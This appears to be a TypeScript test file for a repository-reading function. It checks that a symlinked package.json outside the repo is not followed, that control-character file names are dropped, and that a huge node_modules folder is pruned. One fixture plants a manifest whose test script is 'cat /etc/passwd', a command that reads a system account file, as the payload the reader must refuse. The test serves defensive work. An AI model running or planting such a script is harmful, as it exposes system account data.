test("reading is bounded and safe: a symlinked manifest is not followed, control-character paths are dropped", async () => {
  const outside = await mkdtemp(join(tmpdir(), "stack-outside-"));
  await writeFile(join(outside, "secret.json"), '{"scripts":{"test":"cat /etc/passwd"}}');
  const { root, executor } = await materialise({ "go.mod": "module x\n\ngo 1.22\n" });
  try {
    await symlink(join(outside, "secret.json"), join(root, "package.json"));
    await writeFile(join(root, "bad\nname.txt"), "x");
    const read = await readRepoInputs(executor);
    assert.ok(!("package.json" in read.manifests), "symlink target must not be read");
    assert.ok(!read.files.includes("package.json"));
    assert.ok(read.files.every((f) => !/[\u0000-\u001f]/.test(f)));
    assert.ok(read.notes.some((n) => /control characters/.test(n)));
  } finally {
    await rm(root, { recursive: true, force: true });
    await rm(outside, { recursive: true, force: true });
  }
});

test("a huge node_modules is pruned in the listing, so it cannot push real manifests past the file cap", async () => {
  const tree: Tree = { ...NODE_PNPM };
  for (let i = 0; i < 5100; i++) tree[`node_modules/dep/f${String(i).padStart(4, "0")}.js`] = "x";
  const { root, executor } = await materialise(tree);
  try {
    const read = await readRepoInputs(executor);
    assert.ok(read.notes.every((n) => !/listing cut/.test(n)), read.notes.join());
    assert.ok("package.json" in read.manifests, "sorts after node_modules/, so an unpruned listing would have cut it");
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

